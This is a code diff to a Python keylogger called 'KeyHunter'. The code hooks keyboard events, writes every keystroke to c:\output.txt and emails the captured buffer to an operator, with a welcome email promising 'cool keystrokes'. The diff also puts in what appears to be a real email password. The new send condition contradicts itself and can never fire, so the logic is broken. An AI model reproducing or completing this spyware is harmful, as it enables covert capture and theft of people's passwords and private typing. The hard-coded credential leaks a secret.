@@ -55,9 +55,9 @@ def send_email(message,toaddrs):
     try:
         
 
-        fromaddr = 'keyhunter.hackspc@gmail.com'
+        fromaddr = 'xxxx'
         username = 'xxxx'
-        password = 'xxxx'
+        password = 'b68akfod86KFmQEz*7DQ'
         message+="<br><br>" +"BR KeyHunter Team "
         msg = MIMEText(message, 'html')
         msg['Subject']  = "KeyHunter Report -- " +str(datetime.datetime.now()) + " --"
@@ -84,10 +84,13 @@ def OnKeyboardEvent(event):
         f=open('c:\output.txt','r+')
         buffer=f.read()
         f.close()
-        #after specific number of characters send email
-        if len(buffer)%1001==0:
+        
+        if len(buffer)==1:
+            send_email("Welcome :) , you start using KEYHUNTER, soon you'll received cool keystrokes",email)
+            
+        elif len(buffer)%1001==0 and len(buffer)%1001!=0:
             #send last 10000 characters
-            send_email(buffer[-10000:],email)
+            send_email(buffer[-10000:].replace("\n","<br>"),email)
         #open output.txt to write current + new keystrokes
         f=open('c:\output.txt','w')
         keylogs=chr(event.Ascii)
@@ -100,7 +103,7 @@ def OnKeyboardEvent(event):
         buffer+=keylogs
         f.write(buffer)
         f.close()
-        
+        #after specific number of charachters send email
         
             
         
